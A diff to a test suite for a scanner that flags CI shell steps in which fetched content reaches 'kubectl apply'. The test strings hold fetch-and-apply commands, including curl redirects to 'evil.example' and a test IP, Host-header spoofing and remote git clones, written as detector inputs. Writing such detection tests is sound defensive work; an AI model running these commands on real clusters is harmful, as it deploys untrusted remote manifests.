@@ -345,6 +345,53 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     });
   });
 
+  // ---- #1410 round 6: a loopback fetch is STILL a taint source -----------
+
+  it('round 6: a loopback fetch taints its output — it reaches no apply and no -f path', () => {
+    expectAllFlagged({
+      loopbackPipedToApply: 'curl -s http://127.0.0.1:9000/x | kubectl apply -f -',
+      loopbackWgetPipedToApply: 'wget -qO- http://127.0.0.1:9000/x | kubectl apply -f -',
+      execCurlToFileThenApply:
+        'kubectl exec pod -- curl http://localhost:8080/manifest.yaml > m.yaml\nkubectl apply -f m.yaml',
+      // A port-forward makes "localhost" the upstream: a real remote fetch.
+      portForwardThenApply:
+        'kubectl port-forward svc/x 8080:80 &\ncurl -o r.yaml http://localhost:8080/release.yaml\nkubectl apply -f r.yaml',
+      connectToRedirect:
+        'curl --connect-to localhost:80:evil.example:80 http://localhost/x | kubectl apply -f -',
+      resolveRedirect:
+        'curl --resolve localhost:80:203.0.113.9 http://localhost/x | kubectl apply -f -',
+      hostHeader: "curl -H 'Host: evil.example' http://localhost/x | kubectl apply -f -",
+      loopbackVarPrintf:
+        'X=$(curl -s http://localhost:8080/m)\nprintf %s "$X" | kubectl apply -f -',
+      loopbackVarWholeHeredocLine:
+        'X=$(curl -s http://localhost:8080/m)\nkubectl apply -f - <<YAML\n$X\nYAML',
+      loopbackVarAsTarget: 'X=$(curl -s http://localhost:8080/m)\nkubectl apply -f "$X"',
+      loopbackVarThenApply: 'X=$(curl -s http://localhost:8080/m)\necho "$X" | kubectl apply -f -',
+    });
+  });
+
+  it('round 6: a loopback fetch may still feed grep, tr, a $(…) scalar or /dev/null', () => {
+    expectNoneFlagged({
+      toGrep: 'curl -s http://localhost:9898/v1/t | grep -q ok\nkubectl apply -f deploy/x.yaml',
+      toTr: 'curl -s http://127.0.0.1:9898/v1/t | tr -d "\\n" >/dev/null\nkubectl apply -f deploy/x.yaml',
+      toDevNull:
+        'curl -s -o /dev/null http://localhost:9898/healthz\nkubectl apply -f deploy/x.yaml',
+      toScalar:
+        'CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:9898/x)\ntest "$CODE" = 200\nkubectl apply -f deploy/x.yaml',
+    });
+  });
+
+  it('round 6: cloning a plain local path is not a remote fetch; a remote clone still is', () => {
+    expectNoneFlagged({
+      relativeClone: 'git clone ./local-repo work\nkubectl apply -f deploy/x.yaml',
+      absoluteClone: 'git clone /abs/path/repo work\nkubectl apply -f deploy/x.yaml',
+    });
+    expectAllFlagged({
+      httpsClone: 'git clone https://example.com/r.git work\nkubectl apply -f work/x.yaml',
+      scpClone: 'git clone git@example.com:o/r.git work\nkubectl apply -f work/x.yaml',
+    });
+  });
+
   // ---- #1410 round 5, finding 1: the step's shell decides errexit ---------
 
   const verifiedStep = (mod: string) =>
